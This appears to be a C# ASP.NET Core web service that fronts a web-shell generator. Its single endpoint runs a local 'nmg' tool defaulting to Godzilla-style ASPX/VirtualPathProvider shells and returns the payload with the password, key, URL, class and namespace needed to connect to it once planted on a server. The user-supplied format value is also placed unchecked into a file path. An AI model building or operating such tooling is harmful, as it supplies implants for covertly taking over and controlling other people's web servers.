using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Http;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.UseDefaultFiles();
app.UseStaticFiles();

app.MapPost("/api/generate", async (GenerateRequest opts, HttpContext ctx) =>
{
    if (opts == null || string.IsNullOrEmpty(opts.Pass))
    {
        ctx.Response.StatusCode = 400;
        await ctx.Response.WriteAsJsonAsync(new { error = "password is required" });
        return;
    }

    string outputFormat = opts.Format ?? "aspx";
    var tempFile = Path.Combine(Path.GetTempPath(), $"nmg_{Guid.NewGuid():N}.{outputFormat}");

    var psi = new System.Diagnostics.ProcessStartInfo();
    psi.FileName = "dotnet";
    psi.ArgumentList.Add(FindBuiltDll());
    psi.ArgumentList.Add("generate");
    psi.ArgumentList.Add("--type"); psi.ArgumentList.Add(opts.Type ?? "vpp");
    psi.ArgumentList.Add("--shell"); psi.ArgumentList.Add(opts.Shell ?? "godzilla");
    psi.ArgumentList.Add("--pass"); psi.ArgumentList.Add(opts.Pass);
    psi.ArgumentList.Add("--target"); psi.ArgumentList.Add(opts.Target ?? "net40");
    psi.ArgumentList.Add("--format"); psi.ArgumentList.Add(outputFormat);
    psi.ArgumentList.Add("-o"); psi.ArgumentList.Add(tempFile);
    if (opts.Seed.HasValue)
    {
        psi.ArgumentList.Add("--seed");
        psi.ArgumentList.Add(opts.Seed.Value.ToString());
    }
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;
    psi.UseShellExecute = false;

    var proc = System.Diagnostics.Process.Start(psi);
    if (proc == null)
    {
        ctx.Response.StatusCode = 500;
        await ctx.Response.WriteAsJsonAsync(new { error = "Failed to start nmg" });
        return;
    }
    var stdout = await proc.StandardOutput.ReadToEndAsync();
    var stderr = await proc.StandardError.ReadToEndAsync();
    await proc.WaitForExitAsync();

    if (proc.ExitCode != 0)
    {
        ctx.Response.StatusCode = 500;
        await ctx.Response.WriteAsJsonAsync(new { error = stderr.Trim(), stdout = stdout.Trim() });
        return;
    }

    string payload = "";
    if (File.Exists(tempFile))
    {
        payload = await File.ReadAllTextAsync(tempFile);
        File.Delete(tempFile);
    }

    await ctx.Response.WriteAsJsonAsync(new
    {
        success = true,
        payload = payload,
        stdout = stdout.Trim(),
        connection = new
        {
            pass = opts.Pass,
            key = Extract(stdout, @"key:\s+(\S+)"),
            url = Extract(stdout, @"URL:\s+(\S+)"),
            cls = Extract(stdout, @"class:\s+(\S+)"),
            ns = Extract(stdout, @"namespace:\s+(\S+)")
        }
    });
});

static string FindBuiltDll()
{
    var dir = AppContext.BaseDirectory;
    while (dir != null)
    {
        var candidate = Path.Combine(dir, "src", "bin", "Debug", "net8.0", "nmg.dll");
        if (File.Exists(candidate)) return candidate;
        dir = Path.GetDirectoryName(dir);
    }
    throw new FileNotFoundException("nmg.dll not found");
}

static string Extract(string text, string pattern)
{
    var match = System.Text.RegularExpressions.Regex.Match(text, pattern);
    return match.Success ? match.Groups[1].Value : "";
}

app.Run();

record GenerateRequest
{
    public string? Type { get; set; }
    public string? Shell { get; set; }
    public string? Pass { get; set; }
    public string? Target { get; set; }
    public string? Format { get; set; }
    public int? Seed { get; set; }
    public string? Path { get; set; }
}
